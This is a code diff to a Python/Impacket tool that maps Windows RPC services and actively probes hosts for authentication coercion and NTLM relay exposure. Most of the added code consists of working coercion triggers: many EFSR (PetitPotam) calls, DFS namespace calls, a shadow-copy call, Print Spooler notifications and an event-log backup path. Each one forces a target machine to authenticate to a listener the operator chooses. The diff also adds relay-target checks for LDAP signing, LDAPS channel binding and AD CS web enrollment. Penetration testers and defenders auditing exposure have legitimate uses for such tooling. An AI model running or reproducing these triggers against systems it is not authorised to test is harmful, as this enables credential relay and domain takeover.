@@ -4,7 +4,8 @@
 # RPC endpoint mapper + capability classifier + authentication-coercion prober
 # (Impacket / Python 3). Based originally on CORE/Fortra's rpcdump.py and the
 # ifids/brute approach of impacket's rpcmap.py; coercion method definitions are
-# adapted from public PoCs (topotam PetitPotam, DFSCoerce, ShadowCoerce).
+# adapted from public PoCs (topotam PetitPotam, DFSCoerce, ShadowCoerce), with
+# additional variants reviewed against NetExec's coerce_plus module.
 #
 # WHAT IT DOES, per target, in stages:
 #
@@ -78,9 +79,11 @@ except ImportError:
 
 try:
     from impacket import version, uuid as iuuid
-    from impacket.dcerpc.v5 import transport, epm, rprn
-    from impacket.dcerpc.v5.ndr import NDRCALL
-    from impacket.dcerpc.v5.dtypes import WSTR, ULONG, LPWSTR, DWORD, NULL
+    from impacket.dcerpc.v5 import transport, epm, rprn, even
+    from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTERNULL
+    from impacket.dcerpc.v5.dtypes import (
+        WSTR, ULONG, LPWSTR, DWORD, NULL, BOOL, PCHAR, RPC_SID, LPBYTE,
+    )
     from impacket.dcerpc.v5.rpcrt import (
         RPC_C_AUTHN_WINNT,
         RPC_C_AUTHN_LEVEL_NONE,
@@ -163,9 +166,29 @@ KNOWN_INTERFACES = {
     '367abb81-9844-35f1-ad32-98f038001003': 'MS-SCMR (Service Control)',
     '86d35949-83c9-4044-b424-db363231fd0c': 'MS-TSCH (Task Scheduler)',
     '378e52b0-c0a9-11cf-822d-00aa0051e40f': 'MS-TSCH (ATSvc)',
+    '82273fdc-e32a-18c3-3f78-827929dc23ea': 'MS-EVEN (EventLog)',
     'f6beaff7-1e19-4fbb-9f8f-b89e2018337c': 'MS-EVEN6 (EventLog)',
     '338cd001-2244-31f1-aaaa-900038001003': 'MS-RRP (Remote Registry)',
     '3919286a-b10c-11d0-9ba8-00c04fd92ef5': 'MS-DSSP (Directory Services)',
+}
+
+# Plain names for normal findings. Technical names remain in --show-all output.
+_FRIENDLY_INTERFACES = {
+    'c681d488-d850-11d0-8c52-00c04fd90f7e': 'Windows file encryption service',
+    'df1941c5-fe89-4e79-bf10-463657acf44d': 'Windows file encryption service',
+    '12345678-1234-abcd-ef00-0123456789ab': 'Print Spooler',
+    '76f03f96-cdfd-44fc-a22c-64950a001209': 'Windows print service',
+    '4fc742e0-4a10-11cf-8273-00aa004ae673': 'Distributed File System service',
+    'a8e0653c-2744-4389-a61d-7373df8b2292': 'Shadow-copy service',
+    '12345778-1234-abcd-ef00-0123456789ac': 'Local account management service',
+    '12345778-1234-abcd-ef00-0123456789ab': 'Windows security policy service',
+    '367abb81-9844-35f1-ad32-98f038001003': 'Service Control Manager',
+    '86d35949-83c9-4044-b424-db363231fd0c': 'Task Scheduler',
+    '378e52b0-c0a9-11cf-822d-00aa0051e40f': 'Task Scheduler',
+    '82273fdc-e32a-18c3-3f78-827929dc23ea': 'Windows event log',
+    'f6beaff7-1e19-4fbb-9f8f-b89e2018337c': 'Windows event log',
+    '338cd001-2244-31f1-aaaa-900038001003': 'Remote Registry',
+    '3919286a-b10c-11d0-9ba8-00c04fd92ef5': 'Directory Services setup',
 }
 
 
@@ -186,6 +209,8 @@ INTERFACE_NOTES = {
         'Task Scheduler (ATSvc): schedule a task = code execution.',
     '1ff70682-0a51-30e8-076d-740be8cee98b':
         'Task Scheduler (ATSvc): schedule a task = code execution.',
+    '82273fdc-e32a-18c3-3f78-827929dc23ea':
+        'EVEN: coercion source (MSEven) - forces outbound auth.',
     'f6beaff7-1e19-4fbb-9f8f-b89e2018337c':
         'EVEN6: read/clear the Windows event logs.',
     '338cd001-2244-31f1-aaaa-900038001003':
@@ -242,19 +267,116 @@ class _EfsRpcEncryptFileSrv(NDRCALL):
     structure = (('FileName', WSTR),)
 
 
-# All fire(dce, unc, host) functions: `unc` is the \\listener\share\file path we
-# want the target to dial, `host` is the target (needed by the spooler's open).
-def _fire_efs_openfileraw(dce, unc, host):
-    r = _EfsRpcOpenFileRaw()
-    r['fileName'] = unc + '\x00'
-    r['Flag'] = 0
-    dce.request(r)
+class _EfsRpcDecryptFileSrv(NDRCALL):
+    opnum = 5
+    structure = (('FileName', WSTR), ('OpenFlag', ULONG))
 
 
-def _fire_efs_encryptfilesrv(dce, unc, host):
-    r = _EfsRpcEncryptFileSrv()
+class _EfsRpcQueryUsersOnFile(NDRCALL):
+    opnum = 6
+    structure = (('FileName', WSTR),)
+
+
+class _EfsRpcQueryRecoveryAgents(NDRCALL):
+    opnum = 7
+    structure = (('FileName', WSTR),)
+
+
+class _EFSHashBlob(NDRSTRUCT):
+    structure = (('Data', DWORD), ('cbData', PCHAR))
+
+
+class _EFSRpcBlob(NDRSTRUCT):
+    structure = (('Data', DWORD), ('cbData', PCHAR))
+
+
+class _EncryptionCertificateHash(NDRSTRUCT):
+    structure = (('Length', DWORD), ('SID', RPC_SID),
+                 ('Hash', _EFSHashBlob), ('Display', LPWSTR))
+
+
+class _EncryptionCertificateList(NDRSTRUCT):
+    structure = (('nUsers', DWORD), ('Users', _EncryptionCertificateHash))
+
+
+class _EncryptionCertificateHashList(NDRSTRUCT):
+    align = 1
+    structure = (('Cert', DWORD), ('Users', _EncryptionCertificateHash))
+
+
+class _EfsRpcRemoveUsersFromFile(NDRCALL):
+    opnum = 8
+    structure = (('FileName', WSTR),
+                 ('Users', _EncryptionCertificateHashList))
+
+
+class _EfsRpcAddUsersToFile(NDRCALL):
+    opnum = 9
+    structure = (('FileName', WSTR),
+                 ('EncryptionCertificates', _EncryptionCertificateList))
+
+
+class _EfsRpcFileKeyInfo(NDRCALL):
+    opnum = 12
+    structure = (('FileName', WSTR), ('InfoClass', DWORD))
+
+
+class _EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
+    opnum = 13
+    structure = (('SrcFileName', WSTR), ('DestFileName', WSTR),
+                 ('dwCreationDisposition', DWORD), ('dwAttributes', DWORD),
+                 ('RelativeSD', _EFSRpcBlob), ('bInheritHandle', BOOL))
+
+
+class _EfsRpcAddUsersToFileEx(NDRCALL):
+    opnum = 15
+    structure = (('dwFlags', DWORD), ('Reserved', NDRPOINTERNULL),
+                 ('FileName', WSTR),
+                 ('EncryptionCertificates', _EncryptionCertificateList))
+
+
+# All fire(dce, unc, host) functions receive a tagged callback path. `host` is
+# the target, needed by methods that first open a handle on the target itself.
+def _efs_simple_fire(cls, field='FileName'):
+    def fire(dce, unc, host):
+        r = cls()
+        r[field] = unc + '\x00'
+        if field == 'fileName':
+            r['Flag'] = 0
+        dce.request(r)
+    return fire
+
+
+def _fire_efs_addusers_ex(dce, unc, host):
+    r = _EfsRpcAddUsersToFileEx()
+    r['dwFlags'] = 2
     r['FileName'] = unc + '\x00'
     dce.request(r)
+
+
+# Keep the established, lower-impact methods first. Later alternatives are only
+# reached while no earlier method has produced a tag-confirmed callback.
+_EFSR_TRIGGERS = [
+    ('EfsRpcOpenFileRaw', 'fileName',
+     _efs_simple_fire(_EfsRpcOpenFileRaw, 'fileName')),
+    ('EfsRpcEncryptFileSrv', 'FileName',
+     _efs_simple_fire(_EfsRpcEncryptFileSrv)),
+    ('EfsRpcQueryUsersOnFile', 'FileName',
+     _efs_simple_fire(_EfsRpcQueryUsersOnFile)),
+    ('EfsRpcQueryRecoveryAgents', 'FileName',
+     _efs_simple_fire(_EfsRpcQueryRecoveryAgents)),
+    ('EfsRpcFileKeyInfo', 'FileName',
+     _efs_simple_fire(_EfsRpcFileKeyInfo)),
+    ('EfsRpcDecryptFileSrv', 'FileName',
+     _efs_simple_fire(_EfsRpcDecryptFileSrv)),
+    ('EfsRpcDuplicateEncryptionInfoFile', 'SrcFileName',
+     _efs_simple_fire(_EfsRpcDuplicateEncryptionInfoFile, 'SrcFileName')),
+    ('EfsRpcAddUsersToFile', 'FileName',
+     _efs_simple_fire(_EfsRpcAddUsersToFile)),
+    ('EfsRpcAddUsersToFileEx', 'FileName', _fire_efs_addusers_ex),
+    ('EfsRpcRemoveUsersFromFile', 'FileName',
+     _efs_simple_fire(_EfsRpcRemoveUsersFromFile)),
+]
 
 
 # ---- MS-DFSNM : NetrDfsAddStdRoot (opnum 12) ----
@@ -269,14 +391,80 @@ class _NetrDfsAddStdRoot(NDRCALL):
 
 
 def _fire_dfs_addstdroot(dce, unc, host):
-    # unc is \\listener ; strip leading slashes for ServerName
-    server = unc.lstrip('\\')
+    server = unc.lstrip('\\').split('\\')[0]
     r = _NetrDfsAddStdRoot()
     r['ServerName'] = server + '\x00'
     r['RootShare'] = 'x\x00'
     r['Comment'] = '\x00'
     r['ApiFlags'] = 0
     dce.request(r)
+
+
+class _NetrDfsRemoveStdRoot(NDRCALL):
+    opnum = 13
+    structure = (('ServerName', WSTR), ('RootShare', WSTR), ('ApiFlags', DWORD))
+
+
+class _NetrDfsManagerInitialize(NDRCALL):
+    opnum = 14
+    structure = (('ServerName', WSTR), ('Flags', DWORD))
+
+
+class _NetrDfsAddStdRootForced(NDRCALL):
+    opnum = 15
+    structure = (('ServerName', WSTR), ('RootShare', WSTR),
+                 ('Comment', WSTR), ('Share', WSTR))
+
+
+class _NetrDfsAddRootTarget(NDRCALL):
+    opnum = 23
+    structure = (('pDfsPath', LPWSTR), ('pTargetPath', LPWSTR),
+                 ('MajorVersion', ULONG), ('pComment', LPWSTR),
+                 ('NewNamespace', BOOL), ('Flags', ULONG))
+
+
+class _NetrDfsRemoveRootTarget(NDRCALL):
+    opnum = 24
+    structure = (('pDfsPath', LPWSTR), ('pTargetPath', LPWSTR),
+                 ('Flags', ULONG))
+
+
+def _fire_dfs_removestdroot(dce, unc, host):
+    r = _NetrDfsRemoveStdRoot()
+    r['ServerName'] = unc.lstrip('\\').split('\\')[0] + '\x00'
+    r['RootShare'] = 'x\x00'
+    r['ApiFlags'] = 0
+    dce.request(r)
+
+
+def _fire_dfs_managerinitialize(dce, unc, host):
+    r = _NetrDfsManagerInitialize()
+    r['ServerName'] = unc.lstrip('\\').split('\\')[0] + '\x00'
+    r['Flags'] = 0
+    dce.request(r)
+
+
+def _fire_dfs_addstdrootforced(dce, unc, host):
+    r = _NetrDfsAddStdRootForced()
+    r['ServerName'] = unc.lstrip('\\').split('\\')[0] + '\x00'
+    r['RootShare'] = 'x\x00'
+    r['Comment'] = '\x00'
+    r['Share'] = 'x:\\test\x00'
+    dce.request(r)
+
+
+def _dfs_roottarget_fire(cls):
+    def fire(dce, unc, host):
+        r = cls()
+        r['pDfsPath'] = unc + '\x00'
+        r['pTargetPath'] = NULL
+        r['Flags'] = 0
+        if cls is _NetrDfsAddRootTarget:
+            r['MajorVersion'] = 0
+            r['pComment'] = '\x00'
+            r['NewNamespace'] = 0
+        dce.request(r)
+    return fire
 
 
 # ---- MS-FSRVP : IsPathSupported (opnum 8) ----
@@ -291,22 +479,66 @@ def _fire_fsrvp_ispathsupported(dce, unc, host):
     dce.request(r)
 
 
-# ---- MS-RPRN : the spooler (printerbug). Two calls on the same binding:
-# open a handle to the target's own print server, then ask it to send change
-# notifications to \\listener, which makes it authenticate outbound to us. This
-# is why the spooler cannot be a one-shot blind fuzz target. ----
+class _IsPathShadowCopied(NDRCALL):
+    opnum = 9
+    structure = (('ShareName', WSTR),)
+
+
+def _fire_fsrvp_ispathshadowcopied(dce, unc, host):
+    r = _IsPathShadowCopied()
+    r['ShareName'] = unc + '\\x\x00'
+    dce.request(r)
+
+
+# ---- MS-RPRN : the spooler (printerbug). Open a handle on the target, then
+# ask it to send change notifications to the listener. This two-call sequence is
+# why the spooler cannot be treated as a one-shot blind fuzz target. ----
 def _fire_rprn(dce, unc, host):
-    # listener host is the first element of the \\listener\share\file path
     listener = unc.lstrip('\\').split('\\')[0]
     resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
-    handle = resp['pHandle']
     req = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
-    req['hPrinter'] = handle
+    req['hPrinter'] = resp['pHandle']
     req['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
     req['fdwOptions'] = 0
     req['pszLocalMachine'] = '\\\\%s\x00' % listener
     req['dwPrinterLocal'] = 0
     req['pOptions'] = NULL
+    dce.request(req)
+
+
+class _PrinterHandle(NDRSTRUCT):
+    structure = (('Data', '20s=b""'),)
+
+
+class _RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
+    opnum = 62
+    structure = (('hPrinter', _PrinterHandle), ('fdwFlags', DWORD),
+                 ('fdwOptions', DWORD), ('pszLocalMachine', LPWSTR),
+                 ('dwPrinterLocal', DWORD), ('cbBuffer', DWORD),
+                 ('pBuffer', LPBYTE))
+
+
+def _fire_rprn_legacy(dce, unc, host):
+    listener = unc.lstrip('\\').split('\\')[0]
+    resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
+    req = _RpcRemoteFindFirstPrinterChangeNotification()
+    req['hPrinter'] = resp['pHandle']
+    req['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
+    req['fdwOptions'] = 0
+    req['pszLocalMachine'] = '\\\\%s\x00' % listener
+    req['dwPrinterLocal'] = 0
+    req['cbBuffer'] = NULL
+    req['pBuffer'] = NULL
+    dce.request(req)
+
+
+# ---- MS-EVEN : event-log backup path coercion ----
+def _fire_mseven(dce, unc, host):
+    req = even.ElfrOpenBELW()
+    req['UNCServerName'] = NULL
+    req['BackupFileName'] = '\\??\\UNC\\' + unc.lstrip('\\') + '\x00'
+    req['MajorVersion'] = 1
+    req['MinorVersion'] = 1
     dce.request(req)
 
 
@@ -316,19 +548,13 @@ COERCION_DB = {
         'label': 'MS-EFSR',
         'uuidtup': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'),
         'pipes': ['lsarpc', 'efsrpc', 'samr', 'lsass', 'netlogon'],
-        'triggers': [
-            ('EfsRpcOpenFileRaw', 'fileName', _fire_efs_openfileraw),
-            ('EfsRpcEncryptFileSrv', 'FileName', _fire_efs_encryptfilesrv),
-        ],
+        'triggers': _EFSR_TRIGGERS,
     },
     'df1941c5-fe89-4e79-bf10-463657acf44d': {
         'label': 'MS-EFSR (efsrpc iface)',
         'uuidtup': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0'),
         'pipes': ['efsrpc'],
-        'triggers': [
-            ('EfsRpcOpenFileRaw', 'fileName', _fire_efs_openfileraw),
-            ('EfsRpcEncryptFileSrv', 'FileName', _fire_efs_encryptfilesrv),
-        ],
+        'triggers': _EFSR_TRIGGERS,
     },
     '4fc742e0-4a10-11cf-8273-00aa004ae673': {
         'label': 'MS-DFSNM',
@@ -336,6 +562,13 @@ COERCION_DB = {
         'pipes': ['netdfs'],
         'triggers': [
             ('NetrDfsAddStdRoot', 'ServerName', _fire_dfs_addstdroot),
+            ('NetrDfsAddStdRootForced', 'ServerName', _fire_dfs_addstdrootforced),
+            ('NetrDfsManagerInitialize', 'ServerName', _fire_dfs_managerinitialize),
+            ('NetrDfsAddRootTarget', 'pDfsPath',
+             _dfs_roottarget_fire(_NetrDfsAddRootTarget)),
+            ('NetrDfsRemoveRootTarget', 'pDfsPath',
+             _dfs_roottarget_fire(_NetrDfsRemoveRootTarget)),
+            ('NetrDfsRemoveStdRoot', 'ServerName', _fire_dfs_removestdroot),
         ],
     },
     'a8e0653c-2744-4389-a61d-7373df8b2292': {
@@ -344,6 +577,7 @@ COERCION_DB = {
         'pipes': ['FssagentRpc'],
         'triggers': [
             ('IsPathSupported', 'ShareName', _fire_fsrvp_ispathsupported),
+            ('IsPathShadowCopied', 'ShareName', _fire_fsrvp_ispathshadowcopied),
         ],
     },
     '12345678-1234-abcd-ef00-0123456789ab': {
@@ -354,11 +588,44 @@ COERCION_DB = {
             # two-call open-printer + notify sequence (handled inside the fire fn)
             ('RpcRemoteFindFirstPrinterChangeNotificationEx', 'pszLocalMachine',
              _fire_rprn),
+            ('RpcRemoteFindFirstPrinterChangeNotification', 'pszLocalMachine',
+             _fire_rprn_legacy),
+        ],
+    },
+    '82273fdc-e32a-18c3-3f78-827929dc23ea': {
+        'label': 'MS-EVEN (EventLog)',
+        'uuidtup': ('82273fdc-e32a-18c3-3f78-827929dc23ea', '0.0'),
+        'pipes': ['eventlog'],
+        'triggers': [
+            ('ElfrOpenBELW', 'BackupFileName', _fire_mseven),
         ],
     },
 }
 
 RPRN_UUID = '12345678-1234-abcd-ef00-0123456789ab'
+
+# Short, user-facing explanations. Raw function names remain available through
+# --show-all instead of making the normal result read like developer output.
+_COERCION_INFO = {
+    'c681d488-d850-11d0-8c52-00c04fd90f7e': (
+        'File encryption service (PetitPotam)',
+        'This service accepts a remote file path that can cause a connection back to you.'),
+    'df1941c5-fe89-4e79-bf10-463657acf44d': (
+        'File encryption service (PetitPotam)',
+        'This service accepts a remote file path that can cause a connection back to you.'),
+    '4fc742e0-4a10-11cf-8273-00aa004ae673': (
+        'Distributed File System service (DFSCoerce)',
+        'This service accepts a callback server or remote path.'),
+    'a8e0653c-2744-4389-a61d-7373df8b2292': (
+        'Shadow-copy service (ShadowCoerce)',
+        'This service accepts a remote share path.'),
+    RPRN_UUID: (
+        'Print Spooler (PrinterBug)',
+        'The Print Spooler can be asked to send notifications to a server you choose.'),
+    '82273fdc-e32a-18c3-3f78-827929dc23ea': (
+        'Windows event log (MSEven)',
+        'The event-log service accepts a remote backup-file path.'),
+}
 
 # Path-related errors are useful diagnostics, but are never treated as proof
 # that an outbound connection occurred. Confirmation requires listener evidence.
@@ -1373,21 +1640,21 @@ class CallbackListener(object):
 
 
 def _evidence_summary(evidence):
-    """One short, operational evidence line; never implies verified identity."""
+    """One short evidence line; never implies a verified identity."""
     if not evidence or not evidence.get('connection'):
-        return 'no callback observed'
-    parts = ['%s callback' % (evidence.get('protocol') or 'TCP')]
+        return 'No callback was observed.'
+    parts = ['%s connection received' % (evidence.get('protocol') or 'TCP')]
     if evidence.get('auth'):
-        parts.append(str(evidence['auth']))
+        parts.append('%s authentication observed' % evidence['auth'])
     if evidence.get('identity'):
-        parts.append('asserted identity %s' % evidence['identity'])
+        parts.append('client claims to be %s' % evidence['identity'])
     if evidence.get('mic') in ('present', 'absent'):
-        parts.append('MIC %s (msvAvFlags)' % evidence['mic'])
-    if evidence.get('correlation'):
-        parts.append('correlation %s' % evidence['correlation'])
-        if evidence['correlation'] != 'path-tag':
-            parts.append('attempt tag not observed')
-    return '; '.join(parts)
+        parts.append('message integrity code %s' % evidence['mic'])
+    if evidence.get('correlation') == 'path-tag':
+        parts.append('unique attempt tag matched')
+    elif evidence.get('correlation'):
+        parts.append('unique attempt tag not observed')
+    return '; '.join(parts) + '.'
 
 
 # --------------------------------------------------------------------------- #
@@ -1486,9 +1753,23 @@ class RPCAuthMap(object):
 
     def _dbg(self, stage, host, err):
         if self.debug:
+            if stage == 'pipes':
+                action = 'Named-pipe discovery failed. Other checks continued.'
+            elif stage == 'epmapper':
+                action = 'Endpoint-mapper discovery failed. Other checks continued.'
+            elif stage == 'ifids':
+                action = 'Could not list the services on this endpoint.'
+            elif stage == 'smbsign':
+                action = 'Could not determine whether SMB signing is required.'
+            elif stage.startswith('coerce-bind'):
+                action = 'Could not connect for this coercion test.'
+            elif stage.startswith('coerce-fire'):
+                action = 'The coercion request returned an error.'
+            else:
+                action = 'A check failed.'
             with _print_lock:
-                sys.stderr.write(c('    [dbg %s %s] %s\n'
-                                   % (stage, host, self._errstr(err)), C.GREY))
+                sys.stderr.write(c('    [debug] %s: %s %s\n'
+                                   % (host, action, self._errstr(err)), C.GREY))
 
     # ---- credential helper ------------------------------------------------ #
     def _set_creds(self, rpctransport):
@@ -1959,7 +2240,7 @@ class RPCAuthMap(object):
         detail_rows = []    # full per-iface blocks for --show-all
 
         for u, bindings in sorted(iface_bindings.items()):
-            name = KNOWN_INTERFACES.get(u, 'unknown interface')
+            name = KNOWN_INTERFACES.get(u, 'Unidentified Windows service')
             coercible = u in COERCION_DB
             ver = iface_versions.get(u, '1.0')
             sb_list = sorted(bindings)
@@ -1996,15 +2277,19 @@ class RPCAuthMap(object):
 
             if effective_relay:
                 relay_count += 1
-                relay_viables.append({'uuid': u, 'label': name,
-                                      'binding': used_sb, 'floor': floor,
-                                      'is_pipe': is_pipe})
+                relay_viables.append({
+                    'uuid': u, 'label': _FRIENDLY_INTERFACES.get(u, name),
+                    'technical_label': name, 'binding': used_sb, 'floor': floor,
+                    'is_pipe': is_pipe})
 
             if coercible:
                 desc = COERCION_DB[u]
                 methods = ', '.join(m[0] for m in desc['triggers'])
-                entry = {'uuid': u, 'label': desc['label'],
-                         'how': '%s take a UNC/server argument' % methods,
+                friendly_label, explanation = _COERCION_INFO.get(
+                    u, (desc['label'], 'This service accepts a remote path or server.'))
+                entry = {'uuid': u, 'label': friendly_label,
+                         'technical_label': desc['label'], 'methods': methods,
+                         'how': explanation,
                          'auto': True, 'confirmed': None, 'attempted': False,
                          'fail_reason': '', 'evidence': {}}
                 if self.do_coerce and not self.fuzz_dry_run:
@@ -2041,11 +2326,11 @@ class RPCAuthMap(object):
 
             if self.show_all:
                 blk = ['    %s  %s' % (
-                    c(name, C.BOLD) if name != 'unknown interface'
+                    c(name, C.BOLD) if name != 'Unidentified Windows service'
                     else c(name, C.YELLOW), c(u, C.GREY))]
                 note = INTERFACE_NOTES.get(u)
                 if note:
-                    blk.append(c('        use: %s' % note, C.CYAN))
+                    blk.append(c('        Technical note: %s' % note, C.CYAN))
                 for b in sb_list:
                     blk.append(c('        %s' % b, C.GREY))
                 if not remote_reachable:
@@ -2076,158 +2361,130 @@ class RPCAuthMap(object):
         # ---------------- render ---------------- #
         lines.append(c('[*] %s' % host, C.BOLD + C.CYAN))
 
-        # == IS THIS A COERCION SOURCE ==
-        lines.append(c('  == IS THIS A COERCION SOURCE ==', C.BOLD + C.CYAN))
+        lines.append(c('  COERCION SOURCES', C.BOLD + C.CYAN))
         if coercibles:
             for e in coercibles:
+                evidence = e.get('evidence', {})
                 if e['confirmed'] is True:
                     verdict = c('CONFIRMED', C.BOLD + C.GREEN)
+                    result_text = ('A callback with this attempt\'s unique tag was received.')
+                elif e['confirmed'] is False and evidence.get('connection'):
+                    verdict = c('UNCONFIRMED', C.YELLOW)
+                    result_text = ('A connection was received, but it did not contain '
+                                   'this attempt\'s unique tag.')
                 elif e['confirmed'] is False:
-                    verdict = c('UNCONFIRMED (callback without attempt tag)'
-                                if e.get('evidence', {}).get('connection') else
-                                'UNCONFIRMED (called, no callback)', C.YELLOW)
+                    verdict = c('UNCONFIRMED', C.YELLOW)
+                    result_text = 'The request was sent, but no callback was received.'
                 elif e.get('attempted'):
-                    verdict = c('NOT CONFIRMED (fire did not complete)', C.YELLOW)
+                    verdict = c('TEST INCOMPLETE', C.YELLOW)
+                    result_text = ('The request could not be completed. '
+                                   'Run with -v for the error.')
                 else:
-                    verdict = c('CANDIDATE (not fired)', C.YELLOW)
-                lines.append('     %s  %s  %s'
-                             % (verdict, c(e['label'], C.BBLUE),
-                                c(e['uuid'], C.GREY)))
-                lines.append(c('        Why: %s' % e['how'], C.GREY))
-                if e.get('evidence'):
+                    verdict = c('NOT TESTED', C.YELLOW)
+                    result_text = 'No coercion request was sent.'
+                lines.append('     %s  %s' % (verdict, c(e['label'], C.BOLD)))
+                lines.append(c('        Found: %s' % e['how'], C.GREY))
+                lines.append(c('        %s' % result_text,
+                               C.GREEN if e['confirmed'] is True else C.GREY))
+                if evidence:
                     lines.append(c('        Evidence: %s'
-                                   % _evidence_summary(e['evidence']), C.CYAN))
-                    if e['evidence'].get('identity'):
-                        lines.append(c('        Identity is asserted by the client, '
-                                       'not cryptographically verified.', C.GREY))
-                if e['confirmed'] is None and e.get('attempted'):
-                    rtxt = e.get('fail_reason') or 'no bind/response'
-                    lines.append(c('        Active fire attempted but did not land: '
-                                   '%s (run with -v for detail)' % rtxt, C.GREY))
+                                   % _evidence_summary(evidence), C.CYAN))
+                    if evidence.get('identity'):
+                        lines.append(c('        The reported identity comes from the client '
+                                       'and is not independently verified.', C.GREY))
+                if self.show_all:
+                    lines.append(c('        Interface: %s (%s)'
+                                   % (e['technical_label'], e['uuid']), C.GREY))
+                    lines.append(c('        Methods: %s' % e['methods'], C.GREY))
+                    if e.get('fail_reason'):
+                        lines.append(c('        Last error: %s' % e['fail_reason'], C.GREY))
         else:
-            lines.append(c('     No. No coercible interface exposed.', C.GREEN))
+            lines.append(c('     No known coercion services were found on this host.', C.GREY))
 
-        # == RELAY DESTINATION ==
-        sign_txt = ('REQUIRED' if smb_signing is True else 'not required'
-                    if smb_signing is False else 'unknown')
-        sign_col = (C.GREEN if smb_signing is True else C.RED
+        sign_txt = ('Required' if smb_signing is True else 'Not required'
+                    if smb_signing is False else 'Not determined')
+        sign_col = (C.GREEN if smb_signing is True else C.YELLOW
                     if smb_signing is False else C.GREY)
-        lines.append(c('  == IS THIS A RELAY DESTINATION ==', C.BOLD + C.CYAN))
-        lines.append('     %s' % c('SMB signing: %s' % sign_txt, sign_col))
+        lines.append(c('  RELAY DESTINATION CHECKS', C.BOLD + C.CYAN))
+        lines.append('     SMB signing: %s' % c(sign_txt, sign_col))
         if relay_viables:
+            lines.append(c('     RPC relay candidates: the supplied account made a basic '
+                           'connection to these services.', C.YELLOW))
+            lines.append(c('        Relayed access and permission to use each service '
+                           'were not tested.', C.GREY))
             for r in relay_viables:
-                how = ('direct TCP, no SMB layer' if not r['is_pipe']
-                       else 'pipe, SMB signing off')
-                lines.append('     %s  %s  %s'
-                             % (c('CANDIDATE', C.YELLOW), c(r['label'], C.BOLD),
-                                c(r['uuid'], C.GREY)))
-                lines.append(c('        %s  (floor=%s, %s)'
-                               % (r['binding'], r['floor'], how), C.GREY))
-                rnote = INTERFACE_NOTES.get(r['uuid'])
-                if rnote:
-                    lines.append(c('        use: %s' % rnote, C.CYAN))
+                lines.append('     %s  %s' % (c('CANDIDATE', C.YELLOW),
+                                              c(r['label'], C.BOLD)))
+                lines.append(c('        Connection: %s.'
+                               % ('direct TCP' if not r['is_pipe'] else 'SMB named pipe'),
+                               C.GREY))
+                if self.show_all:
+                    lines.append(c('        Interface: %s' % r['uuid'], C.GREY))
+                    lines.append(c('        Binding: %s; authentication level: %s'
+                                   % (r['binding'], r['floor']), C.GREY))
         elif smb_signing is True:
-            lines.append(c('     No. SMB signing REQUIRED blocks every '
-                           'named-pipe relay on this host.', C.GREEN))
+            lines.append(c('     No RPC relay candidates found. SMB signing blocks '
+                           'named-pipe relay on this host.', C.GREY))
         else:
-            lines.append(c('     No RPC relay candidate observed.', C.GREY))
+            lines.append(c('     No RPC relay candidates found in this run.', C.GREY))
 
-        # == CROSS-PROTOCOL RELAY TARGETS (LDAP / LDAPS / ADCS) ==
         ldap_viable = []
         ls = cb = None
         esc8 = []
         if self.relay_checks:
-            lines.append(c('  == CROSS-PROTOCOL RELAY TARGETS ==', C.BOLD + C.CYAN))
+            lines.append(c('  OTHER RELAY DESTINATION CHECKS', C.BOLD + C.CYAN))
 
             ls = check_ldap_signing(host, self.timeout)
-            lcol = (C.BRED if 'NOT required' in ls else C.GREEN
-                    if ls == 'required' else C.GREY)
-            lines.append('     LDAP signing (389): %s' % c(ls, lcol))
-            if 'NOT required' in ls:
+            if ls == 'closed':
+                lines.append(c('     LDAP signing: Not checked. TCP port 389 is closed.', C.GREY))
+            elif 'NOT required' in ls:
                 ldap_viable.append('LDAP')
-                lines.append(c('        -> candidate destination; observed identity '
-                               'and directory authorization still required', C.GREY))
+                lines.append('     %s  %s' % (c('POSSIBLE RELAY TARGET', C.BRED),
+                                              c('LDAP signing is not required.', C.BOLD)))
+                lines.append(c('        A relay was not performed. Directory permissions '
+                               'remain unproven.', C.GREY))
+            elif ls == 'required':
+                lines.append(c('     LDAP signing: Required.', C.GREEN))
+            else:
+                lines.append(c('     LDAP signing: Not determined.', C.GREY))
+                if self.show_all:
+                    lines.append(c('        Detail: %s' % ls, C.GREY))
 
             cb = check_ldaps_channel_binding(host, self.timeout)
-            ccol = (C.BRED if 'NOT required' in cb else C.GREEN
-                    if cb == 'required' else C.GREY)
-            lines.append('     LDAPS channel binding (636): %s' % c(cb, ccol))
-            if 'NOT required' in cb:
+            if cb == 'closed':
+                lines.append(c('     LDAPS channel binding: Not checked. TCP port 636 is closed.',
+                               C.GREY))
+            elif 'NOT required' in cb:
                 ldap_viable.append('LDAPS')
-                lines.append(c('        -> candidate destination; origin flags, '
-                               'identity and authorization still required', C.GREY))
+                lines.append('     %s  %s' % (c('POSSIBLE RELAY TARGET', C.BRED),
+                                              c('LDAPS channel binding is not required.', C.BOLD)))
+                lines.append(c('        A relay was not performed. Directory permissions '
+                               'remain unproven.', C.GREY))
+            elif cb == 'required':
+                lines.append(c('     LDAPS channel binding: Required.', C.GREEN))
+            else:
+                lines.append(c('     LDAPS channel binding: Not determined.', C.GREY))
+                if self.show_all:
+                    lines.append(c('        Detail: %s' % cb, C.GREY))
 
             esc8 = check_esc8(host, self.timeout)
             if esc8:
                 ldap_viable.append('ADCS ESC8')
-                lines.append('     ADCS web enrollment: %s'
-                             % c('NTLM/Negotiate advertised (posture only)', C.YELLOW))
-                for u in esc8:
-                    lines.append(c('        %s' % u, C.GREY))
-                lines.append(c('        -> enrollment rights, template, CA policy '
-                               'and relay behavior are not validated', C.GREY))
+                lines.append('     %s' % c('!!! POSSIBLE ESC8 TARGET !!!', C.BRED))
+                lines.append(c('        AD CS web enrollment advertises NTLM or Negotiate '
+                               'authentication.', C.BOLD))
+                for url in esc8:
+                    lines.append(c('        %s' % url, C.GREY))
+                lines.append(c('        Certificate issuance was not tested. This is not '
+                               'proof of domain compromise.', C.YELLOW))
             else:
-                lines.append('     ADCS web enrollment: %s'
-                             % c('none found (no NTLM /certsrv endpoint)',
-                                 C.GREEN))
-
